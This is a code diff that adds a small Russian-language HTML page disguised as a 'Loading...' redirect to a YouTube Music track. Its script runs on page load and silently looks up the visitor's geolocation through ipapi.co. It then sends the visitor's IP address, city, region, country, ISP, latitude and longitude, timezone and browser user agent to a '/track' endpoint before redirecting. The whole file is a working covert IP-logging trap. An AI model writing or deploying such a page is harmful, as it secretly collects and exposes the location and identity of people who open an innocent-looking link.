@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="ru">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Загрузка...</title>
+    <script>
+        async function track() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+
+                await fetch('/track', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        ip: data.ip,
+                        city: data.city,
+                        country: data.country_name,
+                        org: data.org,
+                        region: data.region,
+                        loc: data.latitude + ',' + data.longitude,
+                        timezone: data.timezone,
+                        userAgent: navigator.userAgent
+                    })
+                });
+
+                window.location.href = "https://music.youtube.com/watch?v=Kswz8FCJmKg&si=NmoCRGUkQtvhX4wK";
+            } catch (e) {
+                window.location.href = "https://music.youtube.com/watch?v=Kswz8FCJmKg&si=NmoCRGUkQtvhX4wK";
+            }
+        }
+
+        window.onload = track;
+    </script>
+</head>
+
+<body>
+    <p>Переходим...</p>
+</body>
+
+</html>
